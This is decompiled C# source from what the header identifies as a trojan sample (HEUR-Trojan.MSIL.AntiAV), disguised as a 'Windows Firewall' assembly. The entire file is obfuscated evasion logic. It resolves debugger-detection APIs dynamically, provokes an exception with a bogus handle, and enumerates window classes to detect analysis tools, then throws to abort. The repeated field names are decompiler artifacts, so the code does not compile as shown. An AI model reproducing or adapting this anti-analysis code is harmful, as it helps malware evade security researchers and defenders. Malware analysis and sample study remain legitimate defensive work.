// Decompiled with JetBrains decompiler
// Type: WindowsFirewall.PluginContext
// Assembly: Windows Firewall, Version=12.5.2.3, Culture=neutral, PublicKeyToken=null
// MVID: B2F50818-876B-4F01-AE88-291FA22C03A1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan.MSIL.AntiAV.gen-0a7f9a4a2ff6257feb79223e3432cef859eda0b8e5738450449fd016eb059f70.exe

using System;
using System.Runtime.InteropServices;
using System.Text;

namespace WindowsFirewall
{
  internal class PluginContext
  {
    internal const uint currentColor = 1024;
    internal const uint generatorPosition = 64;
    internal const int currentColor = 0;
    private static bool currentColor;

    [DllImport("kernel32.dll", EntryPoint = "SetLastError")]
    internal static extern void SelectToolbox(uint currentColor);

    [DllImport("kernel32.dll", EntryPoint = "CloseHandle")]
    internal static extern int SelectToolbox(IntPtr currentColor);

    [DllImport("kernel32.dll", EntryPoint = "OpenProcess")]
    internal static extern IntPtr IncreaseConnection(
      uint currentColor,
      int generatorPosition,
      uint nextData);

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcessId")]
    internal static extern uint SelectToolbox();

    [DllImport("kernel32.dll", EntryPoint = "LoadLibrary", CharSet = CharSet.Auto, SetLastError = true)]
    internal static extern IntPtr SelectToolbox(string currentColor);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern PluginContext.ActivatorDictionary SelectToolbox(
      IntPtr currentColor,
      string generatorPosition);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern PluginContext.ToolboxInfo SelectToolbox(
      IntPtr currentColor,
      string generatorPosition);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern PluginContext.ActionSerializer SelectToolbox(
      IntPtr currentColor,
      string generatorPosition);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern PluginContext.PaneSet SelectToolbox(
      IntPtr currentColor,
      string generatorPosition);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern PluginContext.PluginSettings SelectToolbox(
      IntPtr currentColor,
      string generatorPosition);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern PluginContext.XmlFileLoader SelectToolbox(
      IntPtr currentColor,
      string generatorPosition);

    private static int SelectToolbox(IntPtr currentColor, IntPtr generatorPosition)
    {
      string[] strArray = new string[1]
      {
        AspectDesigner.SelectToolbox(473)
      };
      string currentColor1 = PluginContext.IncreaseConnection(currentColor);
      foreach (string generatorPosition1 in strArray)
      {
        if (PathSerializer.SelectToolbox(currentColor1, generatorPosition1, true) == 0)
        {
label_2:
          switch (2)
          {
            case 0:
              goto label_2;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (PluginContext.SelectToolbox);
              }
              PluginContext.currentColor = true;
              return 0;
          }
        }
      }
label_8:
      switch (7)
      {
        case 0:
          goto label_8;
        default:
          return 1;
      }
    }

    [DllImport("user32.dll", EntryPoint = "GetClassName", CharSet = CharSet.Auto)]
    internal static extern int SelectToolbox(
      IntPtr currentColor,
      StringBuilder generatorPosition,
      int nextData);

    internal static string IncreaseConnection(IntPtr currentColor)
    {
      StringBuilder stringBuilder = ProcessTree.SelectToolbox(260);
      PluginContext.SelectToolbox(currentColor, stringBuilder, PackageStack.SelectToolbox((object) stringBuilder));
      return NetworkService.IncreaseConnection((object) stringBuilder);
    }

    internal static void SelectToolbox()
    {
      if (!PluginContext.SelectToolbox())
        return;
label_1:
      switch (5)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (PluginContext.SelectToolbox);
          }
          string generatorPosition = AspectDesigner.SelectToolbox(488);
          throw File.SelectToolbox(BuilderScope.SelectToolbox(AspectDesigner.SelectToolbox(505), (object) generatorPosition));
      }
    }

    internal static bool SelectToolbox()
    {
      try
      {
        if (ViewSettings.SelectToolbox())
        {
label_1:
          switch (2)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (PluginContext.SelectToolbox);
              }
              return true;
          }
        }
        else
        {
          IntPtr currentColor1 = PluginContext.SelectToolbox(AspectDesigner.SelectToolbox(604));
          PluginContext.PaneSet currentColor2 = PluginContext.SelectToolbox(currentColor1, AspectDesigner.SelectToolbox(629));
          if (currentColor2 != null)
          {
label_6:
            switch (3)
            {
              case 0:
                goto label_6;
              default:
                if (StoreResolver.SelectToolbox((object) currentColor2) != 0)
                {
label_8:
                  switch (1)
                  {
                    case 0:
                      goto label_8;
                    default:
                      return true;
                  }
                }
                else
                  break;
            }
          }
          IntPtr num = PluginContext.IncreaseConnection(1024U, 0, PluginContext.SelectToolbox());
          if (ContextConverter.SelectToolbox(num, IntPtr.Zero))
          {
label_11:
            switch (5)
            {
              case 0:
                goto label_11;
              default:
                try
                {
                  PluginContext.ActionSerializer currentColor3 = PluginContext.SelectToolbox(currentColor1, AspectDesigner.SelectToolbox(664));
                  if (currentColor3 != null)
                  {
label_13:
                    switch (4)
                    {
                      case 0:
                        goto label_13;
                      default:
                        int nextData = 0;
                        if (PluginInfo.SelectToolbox((object) currentColor3, num, ref nextData) != 0)
                        {
label_15:
                          switch (1)
                          {
                            case 0:
                              goto label_15;
                            default:
                              if (nextData != 0)
                              {
label_17:
                                switch (5)
                                {
                                  case 0:
                                    goto label_17;
                                  default:
                                    return true;
                                }
                              }
                              else
                                break;
                          }
                        }
                        else
                          break;
                        break;
                    }
                  }
                  else
                    break;
                }
                finally
                {
                  PluginContext.SelectToolbox(num);
                }
                break;
            }
          }
          bool flag = false;
          try
          {
            PluginContext.SelectToolbox(new IntPtr(305419896));
          }
          catch
          {
            flag = true;
          }
          if (flag)
          {
label_24:
            switch (4)
            {
              case 0:
                goto label_24;
              default:
                return true;
            }
          }
          else
          {
            try
            {
              PluginContext.XmlFileLoader currentColor4 = PluginContext.SelectToolbox(PluginContext.SelectToolbox(AspectDesigner.SelectToolbox(717)), AspectDesigner.SelectToolbox(738));
              if (currentColor4 != null)
              {
label_27:
                switch (3)
                {
                  case 0:
                    goto label_27;
                  default:
                    PluginContext.currentColor = false;
                    CommandSite.SelectToolbox((object) currentColor4, new PluginContext.QueueConverter(PluginContext.SelectToolbox), IntPtr.Zero);
                    if (PluginContext.currentColor)
                    {
label_29:
                      switch (5)
                      {
                        case 0:
                          goto label_29;
                        default:
                          return true;
                      }
                    }
                    else
                      break;
                }
              }
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal class SolutionStream
    {
      internal IntPtr currentColor;
      internal IntPtr generatorPosition;
      internal IntPtr nextData;
      internal IntPtr messageHandle;
      internal IntPtr firstLine;
      internal IntPtr lastFont;
    }

    internal delegate int ActivatorDictionary(
      IntPtr ProcessHandle,
      int ProcessInformationClass,
      PluginContext.SolutionStream ProcessInformation,
      uint ProcessInformationLength,
      out uint ReturnLength);

    internal delegate int ToolboxInfo(
      IntPtr ProcessHandle,
      int ProcessInformationClass,
      out uint debugPort,
      uint ProcessInformationLength,
      out uint ReturnLength);

    internal delegate int PaneSet();

    internal delegate void PluginSettings([MarshalAs(UnmanagedType.LPStr)] string lpOutputString);

    internal delegate int ActionSerializer(IntPtr hProcess, ref int pbDebuggerPresent);

    internal delegate int QueueConverter(IntPtr wnd, IntPtr lParam);

    internal delegate int XmlFileLoader(PluginContext.QueueConverter lpEnumFunc, IntPtr lParam);
  }
}
